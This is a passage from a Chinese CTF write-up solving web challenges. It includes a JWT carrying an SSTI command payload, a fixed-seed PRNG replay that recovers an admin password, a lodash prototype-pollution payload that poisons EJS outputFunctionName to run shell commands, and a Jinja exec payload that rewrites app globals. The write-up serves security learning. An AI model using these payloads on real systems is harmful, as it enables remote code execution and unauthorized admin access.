      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwibmFtZSI6Int7dXJsX2Zvci5fX2dsb2JhbHNfXy5fX2J1aWx0aW5zX18uX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9mbGFnJykucmVhZCgpfX0ifQ.735KO0e6epwB72sy_SV1cVVdAjo4de_3ffUOl9IorEM
      ```

   6. **开两个 BurpSuite 窗口实现竞争：**

      开两个 BurpSuite 窗口，两个窗口的 `session` 分别填写管理员 JWT 和带 SSTI payload 的 JWT，均访问 `/admin` 路由。

      然后用 Intruder 模块让两个窗口均发送无限重复的 NULL payloads：

      ![image-20260611155022029](https://img.yanxisishi.top/images/2026/06/image-20260611155022029.png)

      在携带管理员 JWT 的窗口，筛选长度后得到 flag：

      ![image-20260611155225803](https://img.yanxisishi.top/images/2026/06/image-20260611155225803.png)

### 小 W 和小 K 的故事（最终章）

```txt
┌──(kali㉿localhost)-[~/Hello_CTF]
└─$ tree src
src
├── app.js
├── package.json
├── utils
│   └── Random.js
└── views
    ├── admin.ejs
    ├── index.ejs
    └── login.ejs

3 directories, 6 files
```

1. **先看路由**

   路由在 `app.js` 里面：

   ```js
   app.get('/', auth, function(req, res, next){
       res.render('index', { userid: req.session.userid, isAdmin: users[req.session.userid].isAdmin });
   });
   
   
   app.get('/login', async function(req, res, next) {
       res.render('login', { error: null });
   })
   app.post('/login', async function(req, res, next) {
       let { username, password } = req.body;
       if (!users[username] || users[username].password !== password) {
           res.render('login', { error: 'Invalid username or password' });
       } else {
           req.session.login = true;
           req.session.userid = username;
           res.redirect(302, '/');
       }
   })
   
   app.get('/admin', adminAuth, async function(req, res, next) {
       res.render('admin', { users: users });
   })
   
   app.get('/logout', auth, async function(req, res, next) {
       req.session.destroy();
       res.redirect(302, '/login');
   })
   
   app.post('/addUser', adminAuth, async function(req, res, next) {
       lodash.defaultsDeep(users, req.body);
       res.redirect(302, '/admin');
   })
   ```

   可以看到 `/`、`/login`、`/admin`、`/logout`、`/addUser` 这几个路由。

2. **分析 `/admin` 路由**

   在附件中全局搜索 `flag` 无果，想想办法进入 `/admin` 路由再做进一步分析。

   `/admin` 路由代码：

   ```js
   app.get('/admin', adminAuth, async function(req, res, next) {
       res.render('admin', { users: users });
   })
   ```

   需要通过 ` adminAuth` 的校验，定位到 `adminAuth()` 方法：

   ```js
   function adminAuth(req, res, next) {
       if (!req.session.login || !req.session.userid || !users[req.session.userid].isAdmin) {
           res.redirect(302, '/');
       } else {
           next();
       }
   }
   ```

   这里会依次检查：

   1. `req.session.login` 是否存在；
   2. `req.session.userid` 是否存在；
   3. `users[req.session.userid].isAdmin` 是否为真。

   接着定位 `users` 的定义代码：

   ```js
   let users = {
       'admin': {
           name: 'admin',
           password: rng.getRandomString(16),
           isAdmin: true,
       },
       'guest': {
           name: 'guest',
           password: "123456",
           isAdmin: false,
       }
   }
   ```

   所以管理员 `admin` 的密码由 `rng.getRandomString(16)` 生成。

   所以可以去定位 `rng` 的定义代码，找到：

   ```js
   const rng = new random(114514);
   ```

   接着定位 `random` 找到：

   ```js
   const random = require('./utils/Random');
   ```

   看到附件中的 `utils/Random.js`：

   ```js
   class Random {
       constructor(seed) {
           this.seed = (seed || Date.now()) % 998244353;
       }
       next() {
           this.seed = (this.seed * 48271) % 998244353;
           return this.seed;
       }
       getRandomInt(min, max) {
           return min + (this.next() % (max - min));
       }
       getRandomFloat(min, max) {
           return min + Math.sin(getRandomInt(0, 10000)) * (max - min);
       }
       getRandomString(length) {
           const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
           let result = "";
           for (let i = 0; i < length; i++) {
               result += charset.charAt(this.getRandomInt(0, charset.length));
           }
           return result;
       }
   }
   
   module.exports = Random;
   ```

3. **破解 `admin` 的密码**

   1. **密码由 `getRandomString()` 决定**

      密码由 `rng.getRandomString(16)` 生成，所以先看到 `getRandomString()` 方法：

      ```js
      getRandomString(length) {
          const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          let result = "";
          for (let i = 0; i < length; i++) {
              result += charset.charAt(this.getRandomInt(0, charset.length));
          }
          return result;
      }
      ```

      其中：

      ```js
      return result;
      ```

      说明最后得到的密码其实就是 `result`，所以看到：

      ```js
      result += charset.charAt(this.getRandomInt(0, charset.length));
      ```

      > **charAt()**
      >
      > 根据下标取出字符串中对应位置的一个字符。
      >
      > 例如：
      >
      > ```js
      > let s = "abcdef";
      > 
      > s.charAt(0); // "a"
      > s.charAt(1); // "b"
      > s.charAt(2); // "c"
      > ```

      因为 `charset` 是固定的，所以密码由 `getRandomInt()` 决定。

   2. **密码由 `getRandomInt()` 决定**

      看到 `getRandomInt()` 的源代码：

      ```js
      getRandomInt(min, max) {
          return min + (this.next() % (max - min));
      }
      ```

      根据 `getRandomInt(0, charset.length)`，其中 `min` 就是 `0`，`max` 就是 `charset.length`，均为已知。

      所以源代码中唯一的变量就是 `this.next()`，所以密码由 `next()` 决定。

   3. 密码由 `next()` 决定

      看到 `next()` 的源代码：

      ```js
      next() {
          this.seed = (this.seed * 48271) % 998244353;
          return this.seed;
      }
      ```

      唯一的变量只有 `this.seed`，所以密码由 `this.seed` 决定。

   4. **密码由 `this.seed` 决定**

      定位到 `this.seed` 的源代码：

      ```js
      constructor(seed) {
          this.seed = (seed || Date.now()) % 998244353;
      }
      ```

      所以如果传入了 `seed`，那么 `this.seed` 就是固定的 `seed`，如果没有传入就是用当前时间 `Date.now()` 作为 `this.seed`。

      由于源码中写了：

      ```js
      const rng = new random(114514);
      ```

      所以 `seed` 就是 `114514`，是固定的。

   综上，**由于传入了固定的 `114514` 作为 `seed`，使用 `rng.getRandomString(16)` 生成的密码是伪随机数，是固定的、可复现的。**

   所以先在附件中找 `rng.getRandomString(16)` 出现了几次，以及作为 `admin` 的密码时是第几次出现，找到：

   ```js
   app.use(session({
       name: 'session',
       secret: rng.getRandomString(16),
   ```

   以及：

   ```js
   let users = {
       'admin': {
           name: 'admin',
           password: rng.getRandomString(16),
   ```

   所以直接利用源码生成两次伪随机数：

   ```js
   class Random {
       constructor(seed) {
           this.seed = (seed || Date.now()) % 998244353;
       }
       next() {
           this.seed = (this.seed * 48271) % 998244353;
           return this.seed;
       }
       getRandomInt(min, max) {
           return min + (this.next() % (max - min));
       }
       getRandomFloat(min, max) {
           return min + Math.sin(getRandomInt(0, 10000)) * (max - min);
       }
       getRandomString(length) {
           const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
           let result = "";
           for (let i = 0; i < length; i++) {
               result += charset.charAt(this.getRandomInt(0, charset.length));
           }
           return result;
       }
   }
   
   const rng = new Random(114514);
   
   console.log(rng.getRandomString(16));
   console.log(rng.getRandomString(16));
   ```

   运行得到：

   ```txt
   JbjULcgJmg6EyKcQ
   XrfGpmeEFZmz8NDZ
   ```

   其中第二次生成伪随机数 `XrfGpmeEFZmz8NDZ` 就是 `admin` 的密码。

   所以管理员账号密码就是：

   ```txt
   username: admin
   password: XrfGpmeEFZmz8NDZ
   ```

4. **找漏洞利用点**

   用 `admin` 的账号密码登陆进去后没有直接得到 flag，需要继续寻找其他的漏洞利用点。

   在 `app,js` 中分析路由时有看到：

   ```js
   app.post('/addUser', adminAuth, async function(req, res, next) {
       lodash.defaultsDeep(users, req.body);
       res.redirect(302, '/admin');
   })
   ```

   这是一个用来添加用户的路由，但是同样需要 `adminAuth` 的校验才能访问，这里可能存在漏洞。

   在浏览器中查 `lodash.defaultsDeep()` 漏洞，查到这个方法存在原型链污染的漏洞：

   ```txt
   漏洞原理
   defaultsDeep() 旨在递归合并对象属性。当它递归处理包含特殊键名（如 constructor 或 __proto__）的恶意 JSON 负载时，缺乏对键名的有效过滤。攻击者可借此向原型链中注入恶意属性（如以下 Payload），从而污染全局对象。
   
   影响范围
   受影响版本为 4.17.11 及以下版本
   ```

   去查看附件中的 `package.json`，里面写了本题中 lodash 的版本：

   ```json
   "lodash": "4.17.11"
   ```

   说明受该漏洞影响。

5. **构造 payload**

   先用 `admin/XrfGpmeEFZmz8NDZ` 登录通过 `adminAuth` 校验，接着访问 `/addUser`。

   由于本题使用了 EJS 引擎渲染模板，可以考虑通过污染 EJS 的配置项 `outputFunctionName` 实现在模板渲染时执行命令。

   > 这个利用点主要对应 EJS 3.1.6 及以下版本，3.1.7 开始对 `outputFunctionName` 做了标识符检查，不能直接塞分号命令。

   查看附件中的 `package.json`，里面写了本题中 EJS 的版本：

   ```json
   "ejs": "3.1.6",
   ```

   说明可以污染 EJS 的配置项 `outputFunctionName` 。

   用 JSON 格式发送 POST 请求的 payload：

   ```json
   {
     "constructor": {
       "prototype": {
         "outputFunctionName": "x;__append(process.mainModule.require('child_process').execSync('cat /flag').toString());//"
       }
     }
   }
   ```

   > `constructor.prototype` 通常就能指向所有普通对象共享的原型，也就是 `Object.prototype`。

   得到 flag。

   ![image-20260614151029624](https://img.yanxisishi.top/images/2026/06/image-20260614151029624.png)

### 眼熟的计算器

不会写 Java，以后学了再补，放个阿米娅卖萌好了。

![95e5d961467497ee365f4d6892c4f669](https://img.yanxisishi.top/images/2026/06/95e5d961467497ee365f4d6892c4f669.png)

## EXTRAS

### who'ssti revenge

跟 **[who'ssti](#whossti)** 的核心区别就是：

```python
if all(need_List.values()):
  global BoleanFlag
  BoleanFlag = True
```

这一部分源码在新版的 revenge 中被注释了，即本题不能通过调用列表中的函数名拿到 flag 了。

本题依旧可以使用 **[who'ssti](#whossti)** 中的盲 SSTI 思路的非预期解，这里不重复。

本题若不使用盲 SSTI 的思路去拿真实源码，可以换另一种思路：

+ 利用本题的 Python 代码执行，实现把所有值为 `False` 的全局变量的值全改成 `True`，这样无论 `BoleanFlag` 在实际源码中是什么样子，都可以实现：

  ```python
  if BoleanFlag:
      return jsonify({"flag": RealFlag})
  ```

例如传入：

```python
{{ url_for.__globals__.__builtins__.exec("for yanxi in k:\n	if k[yanxi] is False:\n		k[yanxi] = True", {'k':url_for.__globals__['current_app'].view_functions['index'].__globals__}) }}
```

> `exec()` 语法：
>
> ```python
> exec("要执行的代码", 全局变量字典)
> ```

1. 先看 `exec()` 第二个参数中一层大括号包裹的 Python 字典。：

   ```python
   {'k':url_for.__globals__['current_app'].view_functions['index'].__globals__}
   ```

   **这部分的作用是把范围定到 `index()` 所在文件的全局变量。**

   其中：

   ```python
   url_for.__globals__['current_app']
   ```

   表示从 `url_for` 的全局变量里拿到当前 Flask 的 `app` 对象。

   ```python
   .view_functions['index']
   ```

   表示从 Flask 保存路由函数的字典里拿到 `/` 路由对应的 `index()` 函数。

   ```python
   .__globals__
   ```

   表示拿到 `index()` 函数所在文件的全局变量字典。

   这部分相当于拿到了类似这样的字典 `k`：

   ```python
   {
       "func_List": [...],
       "need_List": {...},
       "BoleanFlag": False,
       "RealFlag": "flag{...}",
       "app": ...,
       "index": ...
   }
   ```

   只不过实际源码中 `BoleanFlag` 和 `RealFlag` 是被换成随机变量名。

2. 接着看 `exec()` 第一个参数里面真正执行的代码：

   ```python
   for yanxi in k:\n	if k[yanxi] is False:\n		k[yanxi] = True
   ```

   这里就相当于：

   ```python
   for yanxi in k:
       if k[yanxi] is False:
           k[yanxi] = True
   ```

   **意思是遍历全局变量字典 `k` 里面的所有变量名，如果某个全局变量的值严格等于 `False`，就把它改成 `True`。**

   但是注意 Python 语法注重缩进，代码里的 Tab 缩进不要省略。
